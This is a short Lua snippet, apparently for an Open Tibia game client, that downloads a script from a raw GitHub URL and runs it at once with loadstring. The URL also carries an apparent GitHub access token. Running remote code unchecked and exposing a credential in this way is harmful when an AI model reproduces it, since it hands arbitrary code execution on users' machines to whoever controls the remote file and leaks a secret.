local urlScript = 'https://raw.githubusercontent.com/brinquescriptsgamer-bot/customotserver/refs/heads/main/svtrovy.lua?token=GHSAT0AAAAAAEEYZWN7ACDQOUQPSZSZ3GHE2UM6EYQ';
modules.corelib.HTTP.get(urlScript, function(script) 
     assert(loadstring(script))() 
end);
